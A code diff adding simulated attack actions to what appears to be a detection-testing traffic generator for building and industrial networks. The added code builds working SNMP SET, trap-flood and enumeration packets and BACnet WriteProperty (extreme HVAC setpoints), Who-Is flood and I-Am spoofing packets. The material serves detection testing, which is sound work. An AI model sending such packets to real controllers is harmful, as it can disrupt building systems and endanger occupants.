@@ -690,6 +690,153 @@ def _snmp_community_brute(
             current_time += interval_ms + random.randint(-20, 20)
 
 
+@register_action("snmp_set")
+def _snmp_set(
+    params: dict[str, Any],
+    targets: list[TargetInfo],
+    attacker_ip: str,
+    start_time_ms: float,
+) -> Iterator[PacketEvent]:
+    """SNMP SET request — unauthorized configuration change.
+
+    Writes values to writable MIB OIDs such as sysContact, sysName,
+    or device-specific configuration objects.
+    CV should detect: SNMP write attempt, unauthorized configuration change.
+    """
+    community = params.get("community", "private")
+    # Default: overwrite sysContact and sysName
+    oid_value_pairs = params.get("oid_value_pairs", [
+        {"oid": "1.3.6.1.2.1.1.4.0", "value": "compromised@attacker.local"},
+        {"oid": "1.3.6.1.2.1.1.5.0", "value": "PWNED-DEVICE"},
+    ])
+    interval_ms = params.get("interval_ms", 300)
+
+    current_time = start_time_ms
+    request_id = random.randint(1, 0x7FFFFFFF)
+
+    for target in targets:
+        for i, pair in enumerate(oid_value_pairs):
+            oid_parts = [int(x) for x in pair["oid"].split(".")]
+            value_str = str(pair.get("value", ""))
+            snmp_pdu = _build_snmp_set_request(
+                community=community,
+                request_id=request_id + i,
+                oid_parts=oid_parts,
+                value=value_str,
+            )
+            pkt = (
+                Ether()
+                / IP(src=attacker_ip, dst=target.ip_address)
+                / UDP(sport=random.randint(49152, 65535), dport=161)
+                / Raw(load=snmp_pdu)
+            )
+            yield _scapy_to_packet_event(current_time, pkt, "snmp_set", {
+                "target_ip": target.ip_address,
+                "community": community,
+                "oid": pair["oid"],
+                "mitre_technique": "T0836",
+            })
+            current_time += interval_ms + random.randint(-30, 30)
+
+
+@register_action("snmp_trap_flood")
+def _snmp_trap_flood(
+    params: dict[str, Any],
+    targets: list[TargetInfo],
+    attacker_ip: str,
+    start_time_ms: float,
+) -> Iterator[PacketEvent]:
+    """SNMPv2c trap flood — overwhelm NMS with fake notifications.
+
+    Sends rapid-fire trap PDUs to the management station to cause
+    alert fatigue or denial of service on the NMS.
+    CV should detect: SNMP trap flood, abnormal trap rate.
+    """
+    count = params.get("count", 100)
+    rate_ms = params.get("rate_ms", 25)
+    community = params.get("community", "public")
+    # Generic linkDown trap OID
+    trap_oid = params.get("trap_oid", "1.3.6.1.6.3.1.1.5.3")
+
+    current_time = start_time_ms
+    request_id = random.randint(1, 0x7FFFFFFF)
+
+    for target in targets:
+        for i in range(count):
+            snmp_pdu = _build_snmp_v2c_trap(
+                community=community,
+                request_id=request_id + i,
+                trap_oid_parts=[int(x) for x in trap_oid.split(".")],
+                uptime_cs=random.randint(100000, 9999999),
+            )
+            pkt = (
+                Ether()
+                / IP(src=attacker_ip, dst=target.ip_address)
+                / UDP(sport=random.randint(49152, 65535), dport=162)
+                / Raw(load=snmp_pdu)
+            )
+            yield _scapy_to_packet_event(current_time, pkt, "snmp_trap_flood", {
+                "target_ip": target.ip_address,
+                "trap_oid": trap_oid,
+                "mitre_technique": "T0814",
+            })
+            current_time += rate_ms + random.randint(0, 5)
+
+
+@register_action("snmp_getbulk_sweep")
+def _snmp_getbulk_sweep(
+    params: dict[str, Any],
+    targets: list[TargetInfo],
+    attacker_ip: str,
+    start_time_ms: float,
+) -> Iterator[PacketEvent]:
+    """Aggressive SNMP GetBulk sweep across multiple MIB subtrees.
+
+    Walks system, interfaces, IP, and enterprise subtrees for deep
+    infrastructure profiling of signal controllers and field devices.
+    CV should detect: SNMP mass enumeration, extensive MIB walk.
+    """
+    community = params.get("community", "public")
+    subtrees = params.get("subtrees", [
+        "1.3.6.1.2.1.1",       # system
+        "1.3.6.1.2.1.2",       # interfaces
+        "1.3.6.1.2.1.4",       # ip
+        "1.3.6.1.2.1.31",      # ifMIB (extended interfaces)
+        "1.3.6.1.4.1",         # enterprises (vendor-specific)
+    ])
+    requests_per_subtree = params.get("requests_per_subtree", 10)
+    interval_ms = params.get("interval_ms", 100)
+
+    current_time = start_time_ms
+    request_id = random.randint(1, 0x7FFFFFFF)
+
+    for target in targets:
+        for subtree in subtrees:
+            oid_parts = [int(x) for x in subtree.split(".")]
+            for i in range(requests_per_subtree):
+                snmp_pdu = _build_snmp_get_bulk(
+                    community=community,
+                    request_id=request_id,
+                    oid_parts=oid_parts,
+                    max_repetitions=25,
+                )
+                pkt = (
+                    Ether()
+                    / IP(src=attacker_ip, dst=target.ip_address)
+                    / UDP(sport=random.randint(49152, 65535), dport=161)
+                    / Raw(load=snmp_pdu)
+                )
+                yield _scapy_to_packet_event(current_time, pkt, "snmp_getbulk_sweep", {
+                    "target_ip": target.ip_address,
+                    "subtree": subtree,
+                    "mitre_technique": "T0846",
+                })
+                request_id = (request_id + 1) & 0x7FFFFFFF
+                oid_parts = list(oid_parts)
+                oid_parts[-1] += 1
+                current_time += interval_ms + random.randint(-10, 10)
+
+
 # ---------------------------------------------------------------------------
 # BACnet attack actions
 # ---------------------------------------------------------------------------
@@ -726,6 +873,187 @@ def _bacnet_whois(
             "target_ip": target.ip_address,
             "mitre_technique": "T0846",
         })
+
+
+@register_action("bacnet_read_property")
+def _bacnet_read_property(
+    params: dict[str, Any],
+    targets: list[TargetInfo],
+    attacker_ip: str,
+    start_time_ms: float,
+) -> Iterator[PacketEvent]:
+    """BACnet ReadProperty requests — device object enumeration.
+
+    Reads object-list, firmware-revision, model-name, and other
+    properties to fingerprint BACnet controllers and map the BMS.
+    CV should detect: BACnet property enumeration from non-BMS source.
+    """
+    # BACnet property IDs to enumerate
+    property_ids = params.get("property_ids", [
+        76,   # object-list
+        44,   # firmware-revision
+        70,   # model-name
+        121,  # vendor-name
+        120,  # vendor-identifier
+    ])
+    device_instance = params.get("device_instance", 100)
+    interval_ms = params.get("interval_ms", 300)
+    invoke_id = random.randint(0, 254)
+
+    current_time = start_time_ms
+
+    for target in targets:
+        for prop_id in property_ids:
+            apdu = _build_bacnet_read_property_apdu(
+                invoke_id=invoke_id,
+                object_type=8,  # device object
+                instance=device_instance,
+                property_id=prop_id,
+            )
+            pkt_bytes = _build_bacnet_ip_frame(apdu, broadcast=False)
+            pkt = (
+                Ether()
+                / IP(src=attacker_ip, dst=target.ip_address)
+                / UDP(sport=47808, dport=47808)
+                / Raw(load=pkt_bytes)
+            )
+            yield _scapy_to_packet_event(current_time, pkt, "bacnet_read_property", {
+                "target_ip": target.ip_address,
+                "property_id": prop_id,
+                "mitre_technique": "T0802",
+            })
+            invoke_id = (invoke_id + 1) & 0xFF
+            current_time += interval_ms + random.randint(-30, 30)
+
+
+@register_action("bacnet_write_property")
+def _bacnet_write_property(
+    params: dict[str, Any],
+    targets: list[TargetInfo],
+    attacker_ip: str,
+    start_time_ms: float,
+) -> Iterator[PacketEvent]:
+    """BACnet WriteProperty — unauthorized setpoint manipulation.
+
+    Writes to analog-value or analog-output present-value properties
+    to alter HVAC setpoints, lighting levels, or other building controls.
+    CV should detect: unauthorized BACnet write, setpoint change.
+    """
+    # Object type 2 = analog-value, property 85 = present-value
+    object_type = params.get("object_type", 2)
+    instance = params.get("instance", 1)
+    property_id = params.get("property_id", 85)  # present-value
+    values = params.get("values", [5.0, 40.0, 5.0, 40.0])  # extreme temps
+    interval_ms = params.get("interval_ms", 1500)
+    invoke_id = random.randint(0, 254)
+
+    current_time = start_time_ms
+
+    for target in targets:
+        for value in values:
+            apdu = _build_bacnet_write_property_apdu(
+                invoke_id=invoke_id,
+                object_type=object_type,
+                instance=instance,
+                property_id=property_id,
+                value=value,
+            )
+            pkt_bytes = _build_bacnet_ip_frame(apdu, broadcast=False)
+            pkt = (
+                Ether()
+                / IP(src=attacker_ip, dst=target.ip_address)
+                / UDP(sport=47808, dport=47808)
+                / Raw(load=pkt_bytes)
+            )
+            yield _scapy_to_packet_event(current_time, pkt, "bacnet_write_property", {
+                "target_ip": target.ip_address,
+                "object_type": object_type,
+                "instance": instance,
+                "value": value,
+                "mitre_technique": "T0836",
+            })
+            invoke_id = (invoke_id + 1) & 0xFF
+            current_time += interval_ms + random.randint(-100, 100)
+
+
+@register_action("bacnet_whois_flood")
+def _bacnet_whois_flood(
+    params: dict[str, Any],
+    targets: list[TargetInfo],
+    attacker_ip: str,
+    start_time_ms: float,
+) -> Iterator[PacketEvent]:
+    """BACnet Who-Is flood — exhaust controller resources.
+
+    Rapid-fire Who-Is broadcasts to overwhelm BACnet device stacks,
+    causing BMS communication loss.
+    CV should detect: BACnet flood, excessive broadcast traffic.
+    """
+    count = params.get("count", 200)
+    rate_ms = params.get("rate_ms", 15)
+
+    bvlc = bytes([0x81, 0x0B, 0x00, 0x0C])
+    npdu = bytes([0x01, 0x20, 0xFF, 0xFF, 0x00, 0xFF])
+    apdu = bytes([0x10, 0x08])
+    pkt_bytes = bvlc + npdu + apdu
+
+    current_time = start_time_ms
+
+    for target in targets:
+        for _ in range(count):
+            pkt = (
+                Ether()
+                / IP(src=attacker_ip, dst=target.ip_address)
+                / UDP(sport=47808, dport=47808)
+                / Raw(load=pkt_bytes)
+            )
+            yield _scapy_to_packet_event(current_time, pkt, "bacnet_whois_flood", {
+                "target_ip": target.ip_address,
+                "mitre_technique": "T0814",
+            })
+            current_time += rate_ms + random.randint(0, 5)
+
+
+@register_action("bacnet_iam_spoof")
+def _bacnet_iam_spoof(
+    params: dict[str, Any],
+    targets: list[TargetInfo],
+    attacker_ip: str,
+    start_time_ms: float,
+) -> Iterator[PacketEvent]:
+    """BACnet I-Am spoofing — inject false device identities.
+
+    Broadcasts I-Am responses with fabricated device instances to
+    confuse BMS device tables and disrupt supervisory control.
+    CV should detect: BACnet device spoofing, duplicate device instances.
+    """
+    count = params.get("count", 20)
+    interval_ms = params.get("interval_ms", 500)
+    start_instance = params.get("start_instance", 9000)
+
+    current_time = start_time_ms
+
+    for target in targets:
+        for i in range(count):
+            device_instance = start_instance + i
+            iam_apdu = _build_bacnet_iam_apdu(
+                device_instance=device_instance,
+                max_apdu=1476,
+                vendor_id=random.randint(0, 999),
+            )
+            pkt_bytes = _build_bacnet_ip_frame(iam_apdu, broadcast=True)
+            pkt = (
+                Ether()
+                / IP(src=attacker_ip, dst=target.ip_address)
+                / UDP(sport=47808, dport=47808)
+                / Raw(load=pkt_bytes)
+            )
+            yield _scapy_to_packet_event(current_time, pkt, "bacnet_iam_spoof", {
+                "target_ip": target.ip_address,
+                "spoofed_instance": device_instance,
+                "mitre_technique": "T0830",
+            })
+            current_time += interval_ms + random.randint(-50, 50)
 
 
 # ---------------------------------------------------------------------------
@@ -911,3 +1239,172 @@ def _build_snmp_get_request(
     comm = _ber_encode_string(community)
     msg_content = version + comm + pdu
     return bytes([0x30]) + _ber_encode_length(len(msg_content)) + msg_content
+
+
+def _build_snmp_set_request(
+    community: str,
+    request_id: int,
+    oid_parts: list[int],
+    value: str,
+) -> bytes:
+    """Build an SNMPv2c Set-Request PDU."""
+    oid_enc = _ber_encode_oid(oid_parts)
+    val_enc = _ber_encode_string(value)
+    varbind = bytes([0x30]) + _ber_encode_length(len(oid_enc) + len(val_enc)) + oid_enc + val_enc
+    varbind_list = bytes([0x30]) + _ber_encode_length(len(varbind)) + varbind
+
+    # Set-Request PDU (tag 0xA3)
+    req_id = _ber_encode_integer(request_id)
+    error_status = _ber_encode_integer(0)
+    error_index = _ber_encode_integer(0)
+    pdu_content = req_id + error_status + error_index + varbind_list
+    pdu = bytes([0xA3]) + _ber_encode_length(len(pdu_content)) + pdu_content
+
+    version = _ber_encode_integer(1)
+    comm = _ber_encode_string(community)
+    msg_content = version + comm + pdu
+    return bytes([0x30]) + _ber_encode_length(len(msg_content)) + msg_content
+
+
+def _build_snmp_v2c_trap(
+    community: str,
+    request_id: int,
+    trap_oid_parts: list[int],
+    uptime_cs: int,
+) -> bytes:
+    """Build an SNMPv2c Trap PDU (InformRequest-style)."""
+    # VarBind 1: sysUpTime.0
+    uptime_oid = _ber_encode_oid([1, 3, 6, 1, 2, 1, 1, 3, 0])
+    # TimeTicks value (tag 0x43)
+    uptime_bytes = struct.pack(">I", uptime_cs)
+    uptime_val = bytes([0x43]) + _ber_encode_length(len(uptime_bytes)) + uptime_bytes
+    vb1 = bytes([0x30]) + _ber_encode_length(len(uptime_oid) + len(uptime_val)) + uptime_oid + uptime_val
+
+    # VarBind 2: snmpTrapOID.0
+    trap_oid_enc = _ber_encode_oid([1, 3, 6, 1, 6, 3, 1, 1, 4, 1, 0])
+    trap_val = _ber_encode_oid(trap_oid_parts)
+    vb2 = bytes([0x30]) + _ber_encode_length(len(trap_oid_enc) + len(trap_val)) + trap_oid_enc + trap_val
+
+    varbind_data = vb1 + vb2
+    varbind_list = bytes([0x30]) + _ber_encode_length(len(varbind_data)) + varbind_data
+
+    # SNMPv2-Trap PDU (tag 0xA7)
+    req_id = _ber_encode_integer(request_id)
+    error_status = _ber_encode_integer(0)
+    error_index = _ber_encode_integer(0)
+    pdu_content = req_id + error_status + error_index + varbind_list
+    pdu = bytes([0xA7]) + _ber_encode_length(len(pdu_content)) + pdu_content
+
+    version = _ber_encode_integer(1)
+    comm = _ber_encode_string(community)
+    msg_content = version + comm + pdu
+    return bytes([0x30]) + _ber_encode_length(len(msg_content)) + msg_content
+
+
+# ---------------------------------------------------------------------------
+# BACnet packet building helpers
+# ---------------------------------------------------------------------------
+
+
+def _build_bacnet_ip_frame(apdu: bytes, *, broadcast: bool = False) -> bytes:
+    """Wrap a BACnet APDU in BVLC + NPDU for BACnet/IP transport."""
+    # NPDU: version=1, control depends on broadcast
+    if broadcast:
+        npdu = bytes([0x01, 0x20, 0xFF, 0xFF, 0x00, 0xFF])
+    else:
+        npdu = bytes([0x01, 0x04])  # version=1, expecting-reply
+    total = 4 + len(npdu) + len(apdu)
+    func = 0x0B if broadcast else 0x0A  # original-broadcast vs original-unicast
+    bvlc = bytes([0x81, func, (total >> 8) & 0xFF, total & 0xFF])
+    return bvlc + npdu + apdu
+
+
+def _bacnet_encode_object_id(object_type: int, instance: int) -> bytes:
+    """Encode a BACnet object identifier as 4 bytes (type:10 bits, instance:22 bits)."""
+    value = ((object_type & 0x3FF) << 22) | (instance & 0x3FFFFF)
+    return struct.pack(">I", value)
+
+
+def _bacnet_context_tag(tag_number: int, data: bytes) -> bytes:
+    """Build a BACnet context-specific tag with enclosed data."""
+    length = len(data)
+    if length < 5:
+        return bytes([(tag_number << 4) | 0x08 | length]) + data
+    else:
+        return bytes([(tag_number << 4) | 0x0D, length]) + data
+
+
+def _build_bacnet_read_property_apdu(
+    invoke_id: int,
+    object_type: int,
+    instance: int,
+    property_id: int,
+) -> bytes:
+    """Build a BACnet Confirmed-Request ReadProperty APDU."""
+    # PDU type 0 = confirmed-request, service 12 = ReadProperty
+    header = bytes([0x00, 0x04, invoke_id, 0x0C])  # max-segs=0, max-resp=1476
+    # Context 0: objectIdentifier
+    obj_id = _bacnet_encode_object_id(object_type, instance)
+    tag0 = _bacnet_context_tag(0, obj_id)
+    # Context 1: propertyIdentifier
+    if property_id < 256:
+        tag1 = _bacnet_context_tag(1, bytes([property_id]))
+    else:
+        tag1 = _bacnet_context_tag(1, struct.pack(">H", property_id))
+    return header + tag0 + tag1
+
+
+def _build_bacnet_write_property_apdu(
+    invoke_id: int,
+    object_type: int,
+    instance: int,
+    property_id: int,
+    value: float,
+) -> bytes:
+    """Build a BACnet Confirmed-Request WriteProperty APDU."""
+    # PDU type 0 = confirmed-request, service 15 = WriteProperty
+    header = bytes([0x00, 0x04, invoke_id, 0x0F])
+    # Context 0: objectIdentifier
+    obj_id = _bacnet_encode_object_id(object_type, instance)
+    tag0 = _bacnet_context_tag(0, obj_id)
+    # Context 1: propertyIdentifier
+    if property_id < 256:
+        tag1 = _bacnet_context_tag(1, bytes([property_id]))
+    else:
+        tag1 = _bacnet_context_tag(1, struct.pack(">H", property_id))
+    # Context 3: propertyValue (opening tag + REAL + closing tag)
+    real_bytes = struct.pack(">f", value)
+    # Application tag 4 = REAL, length 4
+    app_real = bytes([0x44]) + real_bytes
+    opening = bytes([(3 << 4) | 0x0E])  # context 3 opening tag
+    closing = bytes([(3 << 4) | 0x0F])  # context 3 closing tag
+    tag3 = opening + app_real + closing
+    # Context 4: priority (optional, use 8 = manual operator)
+    tag4 = _bacnet_context_tag(4, bytes([8]))
+    return header + tag0 + tag1 + tag3 + tag4
+
+
+def _build_bacnet_iam_apdu(
+    device_instance: int,
+    max_apdu: int = 1476,
+    vendor_id: int = 0,
+) -> bytes:
+    """Build a BACnet Unconfirmed I-Am APDU."""
+    # PDU type 1 = unconfirmed, service 0 = I-Am
+    header = bytes([0x10, 0x00])
+    # objectIdentifier (application tag 12, length 4)
+    obj_id = _bacnet_encode_object_id(8, device_instance)  # type 8 = device
+    app_obj = bytes([0xC4]) + obj_id
+    # maxAPDUlength (application tag 2 = unsigned)
+    if max_apdu < 256:
+        app_max = bytes([0x21, max_apdu & 0xFF])
+    else:
+        app_max = bytes([0x22, (max_apdu >> 8) & 0xFF, max_apdu & 0xFF])
+    # segmentationSupported (application tag 9 = enumerated, 0 = both)
+    app_seg = bytes([0x91, 0x00])
+    # vendorID (application tag 2 = unsigned)
+    if vendor_id < 256:
+        app_vendor = bytes([0x21, vendor_id & 0xFF])
+    else:
+        app_vendor = bytes([0x22, (vendor_id >> 8) & 0xFF, vendor_id & 0xFF])
+    return header + app_obj + app_max + app_seg + app_vendor
